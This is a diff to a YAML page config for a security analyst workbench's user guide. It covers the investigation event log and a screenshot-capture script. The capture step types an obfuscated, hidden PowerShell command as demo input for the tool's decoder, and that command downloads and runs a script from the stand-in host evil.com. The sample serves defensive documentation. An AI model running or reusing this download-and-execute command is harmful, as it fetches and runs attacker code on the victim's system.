@@ -4,26 +4,28 @@ category: Analyst Workbench
 audience: user
 purpose: Chronological event log per investigation (deterministic id = sha256(input)[:16]).
 when_to_use:
-  - Replaying an old investigation
-  - Audit trail for compliance
-  - Tracking which analyst corrected which decode when
+- Replaying an old investigation
+- Audit trail for compliance
+- Tracking which analyst corrected which decode when
 tips:
-  - Every decode, correction, promote, benchmark, enrichment, and TAXII push auto-lands here
-  - Add free-form notes with the composer at the bottom
-related: [correction_flow, candidate_explorer]
-
-# ------------------------------------------------------------
-# Screenshot capture — Phase 1 User Guide
-# ------------------------------------------------------------
+- Every decode, correction, promote, benchmark, enrichment, and TAXII push auto-lands
+  here
+- Add free-form notes with the composer at the bottom
+related:
+- correction_flow
+- candidate_explorer
 capture:
   login: true
   steps:
-    - url: /workspace
-      wait_for: '[data-testid="input-textarea"]'
-      type_into:
-        selector: '[data-testid="input-textarea"]'
-        text: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
-      click_before: '[data-testid="btn-auto-investigate-inline"]'
-      delay_ms: 4000
-      post_click_ms: 6000
-      full_page: true
+  - url: /workspace
+    wait_for: '[data-testid="input-textarea"]'
+    type_into:
+      selector: '[data-testid="input-textarea"]'
+      text: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+    click_before: '[data-testid="btn-auto-investigate-inline"]'
+    delay_ms: 4000
+    post_click_ms: 6000
+    selectors:
+    - '[data-testid="input-card"]'
+    - '[data-testid="output-card"]'
+    - '[data-testid="threat-analysis-panel"]'
